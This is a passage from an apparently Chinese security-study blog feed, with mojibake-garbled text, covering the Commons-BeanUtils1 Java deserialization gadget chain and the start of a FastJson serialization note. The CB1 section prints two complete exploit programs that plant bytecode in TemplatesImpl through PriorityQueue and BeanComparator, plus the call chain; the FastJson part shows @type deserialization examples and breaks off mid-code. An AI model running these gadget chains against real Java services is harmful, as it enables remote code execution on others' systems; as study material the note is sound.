class="hljs-constructor">Property(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ³¨æ„<code>add</code>çš„æ—¶å€™ä¹Ÿä¼šèµ°åˆ°æœ€ç»ˆçš„<code>compare</code>æ–¹æ³•ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©ä»–ååºåˆ—åŒ–æ—¶æ‰è§¦å‘ã€‚è¿™é‡Œæ€è·¯å°±è·Ÿå‰é¢é‚£å‡ æ¡æ”¹å€¼çš„é“¾å­ä¸€æ ·ï¼šå…ˆæ”¾ä¸ªæ²¡å•¥ç”¨çš„å˜é‡è¿›å»ï¼Œç„¶åé€šè¿‡åå°„ä¿®æ”¹å°±è¡Œã€‚</p><p>æœ€ç»ˆEXPï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB1FinalEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>));  <br> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();  <br> <span class="hljs-comment">// åˆ›å»ºæ–°çš„é˜Ÿåˆ—ï¼Œå¹¶æ·»åŠ æ¶æ„å­—èŠ‚ç   </span><br> <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);  <br> queue.add(<span class="hljs-number">1</span>);  <br> queue.add(<span class="hljs-number">1</span>);  <br>  <br> <span class="hljs-comment">//å¯ä»¥çœ‹ä¸‹beanComparatorçš„æ„é€ æ–¹æ³•ï¼šè¿™é‡ŒæŠŠpropertyçš„å€¼è®¾ç½®ä¸ºoutputPropertiesï¼Œç›®çš„æ˜¯è°ƒç”¨getOutputProperties()è¿™ä¸ªæ–¹æ³•</span><br> setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);  <br><br> setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);  <br> serialize(queue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);  <br> field.setAccessible(<span class="hljs-literal">true</span>);  <br> field.set(obj, value);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨é“¾ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span>  -&gt;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span> -&gt;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span> -&gt;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-params">templatesImpl</span>, <span class="hljs-params">outputProperties</span>)</span><br>-&gt;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br></code></pre></td></tr></table></figure><p><img src="/img/cb1.png" alt="cb1"></p><p>ç½‘ä¸Šçœ‹äº†å…¶å®ƒå¸ˆå‚…çš„å†™æ³•ï¼Œè¿˜èƒ½è¿™ä¹ˆå†™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Clac.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        BeanComparator beanComparator=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        BeanComparator beanComparator1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator1);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(beanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br><br>        <span class="hljs-comment">//serialize(priorityQueue);</span><br>       unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å°±å¤šäº†è¿™å‡ ä¸ªä¸œè¥¿ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanComparator beanComparator1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator1);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br></code></pre></td></tr></table></figure><p>å…¶å®ç›®æ ‡è¿˜æ˜¯ä¿è¯<code>add</code>çš„æ—¶å€™ä¸å¼¹è®¡ç®—å™¨ï¼Œæ‰€ä»¥æ”¾äº†å‡çš„<code>queue</code>å’Œ<code>comparator</code>è¿›å»ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„</p><p><a href="https://xz.aliyun.com/t/10457">å‚è€ƒæ–‡ç« </a></p><p><a href="https://blog.csdn.net/qq_35733751/article/details/119862728">CC7</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/">å‚è€ƒæ–‡ç« </a></p><p>ç­‰ç­‰ç­‰ã€‚ã€‚ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨åˆæ¢_FastJsonå­¦ä¹ ç¬”è®°</title>
    <link href="/2024/04/27/FastJson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/04/27/FastJson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>ä¸€äº›æœ‰å…³FastJsonçš„å­¦ä¹ ç¬”è®°</p><span id="more"></span><p>åªåšç®€å•è®°å½•ï¼Œå…·ä½“å‚è€ƒè¿™ä¸¤ä½å¸ˆå‚…çš„æ–‡ç« ï¼š</p><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson-%E7%AF%87-01-Fastjson-%E5%9F%BA%E7%A1%80">1</a></p><p><a href="https://xz.aliyun.com/t/12096">2</a></p><p>å­¦ä¹ è§†é¢‘ï¼š</p><p><a href="https://www.bilibili.com/video/BV1bD4y117Qh">3</a></p><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p><code>Fastjson</code>æä¾›ä¸¤ä¸ªä¸»è¦æ¥å£æ¥åˆ†åˆ«å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œï¼š</p><p><code>JSON.toJSONString</code> å°† Java å¯¹è±¡è½¬æ¢ä¸º json å¯¹è±¡ï¼Œåºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚</p><p><code>JSON.parseObject/JSON.parse</code> å°† json å¯¹è±¡é‡æ–°å˜å› Java å¯¹è±¡ï¼Œååºåˆ—åŒ–çš„è¿‡ç¨‹</p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(student);<br></code></pre></td></tr></table></figure><ul><li><code>JSON.toJSONString</code> æ˜¯ Fastjson åº“ä¸­ç”¨äºå°† Java å¯¹è±¡è½¬æ¢ä¸º JSON å­—ç¬¦ä¸²çš„æ–¹æ³•ã€‚</li><li><code>student</code> æ˜¯è¦è½¬æ¢ä¸º JSON å­—ç¬¦ä¸²çš„ Java å¯¹è±¡ã€‚</li></ul><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><p>æ¯”å¦‚å¯¹äºå¦‚ä¸‹Javabeanç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//User.java</span><br><span class="hljs-keyword">package</span> MyJson;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ— å‚æ„é€ &quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æœ‰å‚æ„é€ &quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è°ƒç”¨äº†toString!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, id=&quot;</span> + id +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.print(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getId&quot;</span>);<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setId&quot;</span>);<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//UserSer.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserSer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setName(<span class="hljs-string">&quot;abc&quot;</span>);<br>        user.setId(<span class="hljs-number">6</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>        System.out.println(jsonString);<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson3.png" alt="fastjson3"></p><p>ä½†æ˜¯è¿™é‡Œè½¬åŒ–çš„å­—ç¬¦ä¸²åªæœ‰å±æ€§çš„å€¼ï¼Œæ— æ³•åŒºåˆ†æ˜¯å“ªä¸ªç±»è¿›è¡Œäº†åºåˆ—åŒ–è½¬åŒ–çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œå°±æœ‰äº†åœ¨<code>JSON.toJSONString</code>çš„ç¬¬äºŒä¸ªå‚æ•°<code>SerializerFeature.WriteClassName</code>å†™ä¸‹è¿™ä¸ªç±»çš„åå­—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//UserSer.java</span><br><span class="hljs-keyword">package</span> MyJson;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserSer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setName(<span class="hljs-string">&quot;abc&quot;</span>);<br>        user.setId(<span class="hljs-number">6</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);<br>        System.out.println(jsonString);<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson2.png" alt="fastjson2"></p><p><code>SerializerFeature.WriteClassName</code> æ˜¯ Fastjson åºåˆ—åŒ–ç‰¹æ€§ï¼Œå®ƒè¡¨ç¤ºåœ¨ç”Ÿæˆçš„ JSON å­—ç¬¦ä¸²ä¸­åŒ…å«ç±»åä¿¡æ¯ã€‚è®¾ç½®ä¹‹ååœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¤šå†™å…¥ä¸€ä¸ª@typeï¼Œæ ‡è¯†çš„æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯ç”±æŸä¸ªç±»åºåˆ—åŒ–è€Œæ¥ï¼Œå¹¶ä¸”è°ƒç”¨å…¶ <code>getter</code>&#x2F;<code>setter</code>&#x2F;<code>is</code> æ–¹æ³•ã€‚</p><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>å°† json æ•°æ®ååºåˆ—åŒ–æ—¶å¸¸ä½¿ç”¨çš„æ–¹æ³•ä¸º<code>parse()</code>ã€<code>parseObject()</code>ã€‚</p><ul><li><p><code>parse()</code> æ–¹æ³•ç”¨äºå°† JSON å­—ç¬¦ä¸²è½¬æ¢ä¸ºå•ä¸ªçš„ Java å¯¹è±¡ã€‚</p></li><li><p>è¿”å›çš„æ˜¯ä¸€ä¸ªæ³›å‹å¯¹è±¡ï¼Œä½ éœ€è¦æ‰‹åŠ¨è¿›è¡Œç±»å‹è½¬æ¢ä¸ºä½ æœŸæœ›çš„å¯¹è±¡ç±»å‹ã€‚</p></li><li><p>å¦‚æœ JSON å­—ç¬¦ä¸²ä¸­åŒ…å«äº†å¤šä¸ªå¯¹è±¡ï¼Œåˆ™åªä¼šè§£æç¬¬ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å¿½ç•¥å…¶ä»–å¯¹è±¡ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span> jsonObject = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonString);<br></code></pre></td></tr></table></figure></li><li><p><code>parseObject()</code> æ–¹æ³•ç”¨äºå°† JSON å­—ç¬¦ä¸²è½¬æ¢ä¸ºæŒ‡å®šç±»å‹çš„ Java å¯¹è±¡ã€‚</p></li><li><p>å¯ä»¥æŒ‡å®šè¦è½¬æ¢çš„ç›®æ ‡å¯¹è±¡çš„ç±»ï¼ŒFastjson å°†å°è¯•å°† JSON å­—ç¬¦ä¸²æ˜ å°„åˆ°è¯¥ç±»çš„å¯¹è±¡å®ä¾‹ã€‚</p></li><li><p>è¿”å›çš„æ˜¯æŒ‡å®šç±»å‹çš„ Java å¯¹è±¡ã€‚</p></li><li><p>å¦‚æœ JSON å­—ç¬¦ä¸²ä¸­åŒ…å«å¤šä¸ªå¯¹è±¡ï¼Œåˆ™åªè§£æç¬¬ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶æ˜ å°„åˆ°æŒ‡å®šç±»å‹çš„å¯¹è±¡å®ä¾‹ä¸­ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Student student = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse<span class="hljs-constructor">Object(<span class="hljs-params">jsonString</span>, Student.<span class="hljs-params">class</span>)</span>;<br></code></pre></td></tr></table></figure></li></ul><p><code>eg</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> MyJson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><span class="hljs-keyword">import</span> MyJson.User;<br><span class="hljs-keyword">import</span> java.lang.reflect.Type;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;MyJson.User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parseObject(json));<br>        System.out.println(JSON.parse(json));<br>        &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson4.png" alt="fastjson4"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> MyJson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><span class="hljs-keyword">import</span> MyJson.User;<br><span class="hljs-keyword">import</span> java.lang.reflect.Type;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 